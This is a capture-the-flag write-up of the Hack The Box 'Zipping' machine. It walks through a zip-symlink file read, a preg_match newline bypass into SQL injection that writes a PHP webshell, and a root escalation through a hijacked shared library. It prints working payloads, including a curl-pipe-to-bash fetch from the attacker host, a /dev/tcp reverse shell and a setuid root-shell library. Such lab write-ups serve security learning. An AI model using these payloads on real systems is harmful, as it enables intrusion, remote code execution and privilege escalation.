---
title:  "HTB Zipping Writeup"
date:   2024-01-13 00:30:00 
categories: HTB Machine
tags: SQLI Binary_exploitation zip_symlink_abuse LFI
---

![Zipping](/assets/img/Zipping/1692888609373.jpg)

## Introduction

The initial access for this machine was quite interesting first a Local File Inclusion using symlinks within a zip file to be able to read arbitary files of the machine. This lead to the disclosure of the source code making it possible discover a SQL injection vulnerability. Getting access to root was a pretty straight forward case of binary exploitation, filling in a missing shared library.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.229
```
**Nmap**
```
# Nmap 7.94 scan initiated Thu Dec 28 17:08:56 2023 as: nmap -sS -A -p- -o nmap 10.10.11.229
Nmap scan report for 10.10.11.229
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/28%OT=22%CT=1%CU=38705%PV=Y%DS=2%DC=T%G=Y%TM=658DF2
OS:25%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   30.20 ms 10.10.14.1
2   30.37 ms 10.10.11.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 28 17:09:41 2023 -- 1 IP address (1 host up) scanned in 45.60 seconds
```

Looking at the nmap output we can see that only the web application port **80** is open here. So lets go check this one out. When I looked at the web page i saw that this was a webshop selling watches. Looking through the application it has a web shop part as well a part where we can upload a zip file with our resume to apply for a job there at **http://10.10.11.229/upload.php**

![Zipping Homepage](/assets/img/Zipping/Zipping_01.png)

### Zip symlink exploit

While testing the zip upload functionality i found out that whenever a zip gets uploaded the application would unpack the zip and allow us to download the pdf again after being unpacked. This made me think what if i upload a file with a symlink. If the application allows this it allow me to link application files to this file making it possible to extract any file this user has access too. Create a symlink  using the following command. and create a zip file using the **--symlinks** parameter.

```
ln -s /var/www/html/shop/index.php cv1.pdf
zip --symlinks test.zip cv1.pdf
```

Then after doing these commands upload this zipfile with the upload function. This function sends the following request. Do keep in mind that the symlink is not readable content for this write up.

```
POST /upload.php HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------323440569639095784743013466854
Content-Length: 532
Origin: http://10.10.11.229
Connection: close
Referer: http://10.10.11.229/upload.php
Cookie: PHPSESSID=73lml6dp7ndhvc7f29dn95el34
Upgrade-Insecure-Requests: 1

-----------------------------323440569639095784743013466854

Content-Disposition: form-data; name="zipFile"; filename="test.zip"
Content-Type: application/zip

ZIP content here

```

The server would then issue the following response giving us a link we can follow to grab our file.

```
HTTP/1.1 200 OK
Date: Thu, 28 Dec 2023 23:33:44 GMT
Server: Apache/2.4.54 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 5618
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<html lang="en">
<head>
        <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Creative Design landing page.">
    <meta name="author" content="Devcrud">
    <title>Zipping | Watch store</title>

    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">

    <!-- Bootstrap + Creative Design main styles -->
        <link rel="stylesheet" href="assets/css/creative-design.css">

</head>
<body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">
    <!-- Page Header -->
    <header class="header header-mini"> 
      <div class="header-title">Work with Us</div> 
      <nav aria-label="breadcrumb">
         <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
            <li class="breadcrumb-item active" aria-current="page">Work with Us</li>
         </ol>
      </nav>
    </header> <!-- End Of Page Header -->

    <section id="work" class="text-center">
        <!-- container -->
        <div class="container">
            <h1>WORK WITH US</h1>
            <p class="mb-5">If you are interested in working with us, do not hesitate to send us your curriculum.<br> The application will only accept zip files, inside them there must be a pdf file containing your curriculum.</p>

            <p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="uploads/4ade37ebac0fcbc357efc4939c4c80bb/cv1.pdf">uploads/4ade37ebac0fcbc357efc4939c4c80bb/cv1.pdf</a></p>
      <snipped>
```

Now if we follow that link we'd be able to read the contents of the index page of the webshop.

```
GET /uploads/4ade37ebac0fcbc357efc4939c4c80bb/cv1.pdf HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.229/upload.php
Cookie: PHPSESSID=73lml6dp7ndhvc7f29dn95el34
Upgrade-Insecure-Requests: 1
```

The server then issued the following response disclosing the shops index page

```
HTTP/1.1 200 OK
Date: Thu, 28 Dec 2023 23:33:45 GMT
Server: Apache/2.4.54 (Ubuntu)
Last-Modified: Thu, 28 Dec 2023 23:33:44 GMT
ETag: W/"197-60d9a58b98156"
Accept-Ranges: bytes
Content-Length: 407
Connection: close
Content-Type: application/pdf

<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

So now we repeat this process for the following files to get all the application files letting us analyze them

- ln -s /var/www/html/shop/functions.php cv1.pdf
- ln -s /var/www/html/shop/product.php cv1.pdf
- ln -s /var/www/html/upload.php cv1.pdf


### source code analysis

#### Shop index.php

So now we have the source code of this application we can start digging deeper into it. First of all i checked out the **index.php** page of the webshop. Looking at this page the line containing the **page** variable is very interesting. Basically this means using the page parameter in the url we can try to make it read any php file present on the system. It also doesn't have any protections against path traversal attacks. At this moment this moment i can't do anything with this but if we are able to upload a php page to the application it would allow us to render it even if its not within the webroot.


```php
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```
#### Functions

This page didn't really have much information other than that **mysql** and all of its parameters.

```php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
    	// If there is an error with the connection, stop the script and display the error.
    	exit('Failed to connect to database!');
    }
}
// Template header, feel free to customize this
function template_header($title) {
$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;
echo <<<EOT
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>$title</title>
		<link href="assets/style.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
	</head>
	<body>
        <header>
            <div class="content-wrapper">
                <a href=".." style="text-decoration: none;"><h1>Zipping Watch Store</h1></a>
                <nav>
                    <a href="index.php">Home</a>
                    <a href="index.php?page=products">Products</a>
                </nav>
                <div class="link-icons">
                    <a href="index.php?page=cart">
						<i class="fas fa-shopping-cart"></i>
						<span>$num_items_in_cart</span>
					</a>
                </div>
            </div>
        </header>
        <main>
EOT;
}
// Template footer
function template_footer() {
$year = date('Y');
echo <<<EOT
        </main>
        <footer>
            <div class="content-wrapper">
                <p>&copy; $year, Zipping Watch Store</p>
            </div>
        </footer>
    </body>
</html>
EOT;
}
?>
```


#### product.php

Looking at the code of the products page we could see that the only thing holding us back from SQL injection was the preg_match function which basically makes any request that contains anything but numbers automatically redirect to the index page. So we will need to find a way to bypass this if we want to exploit this potential sql injection.


```php
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

<?=template_header('Zipping | Product')?>

<div class="product content-wrapper">
    <img src="assets/imgs/<?=$product['img']?>" width="500" height="500" alt="<?=$product['name']?>">
    <div>
        <h1 class="name"><?=$product['name']?></h1>
        <span class="price">
            &dollar;<?=$product['price']?>
            <?php if ($product['rrp'] > 0): ?>
            <span class="rrp">&dollar;<?=$product['rrp']?></span>
            <?php endif; ?>
        </span>
        <form action="index.php?page=cart" method="post">
            <input type="number" name="quantity" value="1" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
            <input type="hidden" name="product_id" value="<?=$product['id']?>">
            <input type="submit" value="Add To Cart">
        </form>
        <div class="description">
            <?=$product['desc']?>
        </div>
    </div>
</div>

<?=template_footer()?>
```

### SQLI to RCE

Knowing that preg_match is being used there is a common bypass that often works with this method. by supplying a linefeed it will ignore what comes before  that. So our payload would have to be in theory **linefeed** OUR SQL STATEMENTS **linefeed** number. So to test out this theory i just  added a character that isn't allowed between two linefeeds and ending with a number

```
%0Athisfiledoesnotexist%0A3
```

I sent the following request with our payload.
```
GET /shop/index.php?page=product&id=%0Athisfiledoesnotexist%0A3 HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=73lml6dp7ndhvc7f29dn95el34
Upgrade-Insecure-Requests: 1
```
The server then issued the following response saying the product is not found. This means we bypassed the preg_match filter
```
HTTP/1.1 200 OK
Date: Fri, 29 Dec 2023 10:00:50 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 23
Connection: close
Content-Type: text/html; charset=UTF-8

Product does not exist!
```

So now we know we can bypass the filter. The next step is to create a good sqli payload. I played around with many different payloads though noticed it was not possible to find any interesting data in the database itself. But then combining the knowledge we gained from the index page it came to me: we can just upload a php file somewhere that isn't in the webroot and then call it using the index.php page parameter. 

So knowing that this application is using mysql in the backend i searched for a querry that would allow me to write a file. In this query i'd just write a  php oneliner giving me the power to execute a shell command. The **INTO** sql statement allows a user to dump the results of a query into a file we can then use in combination with a select statement of a string value. It would look something like this:

```
select '<?php system("curl http://10.10.14.153/shell.sh|bash");?>' into outfile '/var/lib/mysql/calico.php'
```

The writing path might look a bit odd but when i was testing this i noticed i wasn't able to write anywhere else so i ended up trying to write in the mysql default directory since there it should always be allowed to write files. Additionally you migh be wondering why do i use a curl command to load this script. Well when trying this without this method the connection would die instantly. 

Create a file with a basic bash reverse shell in it and write it to a file named shell.sh

```
/bin/bash -l > /dev/tcp/10.10.14.153/443 0<&1 2>&1
```
Next run the python http.server module to make that directory into a webserver 

```
python3 -m http.server 80 
```

So now we know our payload the next step is to break out of the sql statement and properly URL encoding this payload. We'd end up with the following payload

```
%0A'%3bselect+'<%3fphp+system("curl+http%3a//10.10.14.153/shell.sh|bash")%3b%3f>'+into+outfile+'/var/lib/mysql/calico3.php'+%231
```

I sent the following request with this  payload.

```
GET /shop/index.php?page=product&id=%0A%27%3bselect+%27%3C%3fphp+system(%22curl+http%3a//10.10.14.153/shell.sh|bash%22)%3b%3f%3E%27+into+outfile+%27/var/lib/mysql/calico3.php%27+%231 HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=73lml6dp7ndhvc7f29dn95el34
Upgrade-Insecure-Requests: 1
```
The server then issues the following response because we didn't return a valid product

```
HTTP/1.1 200 OK
Date: Fri, 29 Dec 2023 10:32:50 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 23
Connection: close
Content-Type: text/html; charset=UTF-8

Product does not exist!
```

Now we were able to reach this file by sending the following request. The page parameter contains the url encoded path to our page we just saved.

```
GET /shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fcalico3 HTTP/1.1
Host: 10.10.11.229
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=73lml6dp7ndhvc7f29dn95el34
Upgrade-Insecure-Requests: 1
```

Then a moment later we could see that the machine tried to grab our shell.sh file

![Shell file grabbed](/assets/img/Zipping/Zipping_02.png)

Then a few moments later we would get a connection on our reverse shell listener as well

![Shell file grabbed](/assets/img/Zipping/Zipping_03.png)

## Privilege escalation

When i landed on the box first thing i did was to check if this user is allowed to run any commands as root by running sudo -l. here we could see that this user was allowed to run the **/usr/bin/stock** custom binary.

![Sudo](/assets/img/Zipping/Zipping_04.png)


When i tried to run this binary it would be very difficult to use because some of the input was not showing in my shell. So to counter this i added my public key to the authorized_keys file in the ssh directory.

```
echo 'ssh-rsa <SNIPPED> kali@kali' > ~/.ssh/authorized_keys
```

Next we could log into the machine using ssh 

```
ssh -i ~/.ssh/id_rsa rektsu@10.10.11.229
```

So when we logged into this machine i tried to run the binary again and i would get a prompt asking for a password.

![Password required](/assets/img/Zipping/Zipping_05.png)

So my first guess is to run strings on this binary to see if the password will come rolling out there. And in this case we were lucky and the password **St0ckM4nager** would be in the output.

```
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
<snipped>
```

So now I was able to log into application and was greeted with the following prompt. Non of these functions looked to be suspicious or vulnerable at first sight so i'd have to dig deeper.

![Logged in](/assets/img/Zipping/Zipping_06.png)

My first guess was to use strace to see what calls this binary is executing in the background while we use it. When logging into the application we can see that a custom shared library is being loaded located in the user directory of this user **/home/rektsu/.config/libcounter.so**. Which at this point is not being found either.
```
strace /usr/bin/stock
```

![Shared library](/assets/img/Zipping/Zipping_07.png)


So knowing we can write this shared library we should create one that allows us to execute commands as root. The most common and easy code example is the following where we set the uid and guid to 0 making it execute as root.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void vuln_func() __attribute__((constructor));

void vuln_func() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

Then we compile this c code  using the following command and place it in the **/home/rektsu/.config** directory 

```
gcc -shared -o libcounter.so -fpic exploit.c
```

After compiling this exploit we just run the same binary again using sudo. after entering the password we'd get access to a bash shell with root privileges

![Root access](/assets/img/Zipping/Zipping_08.png)
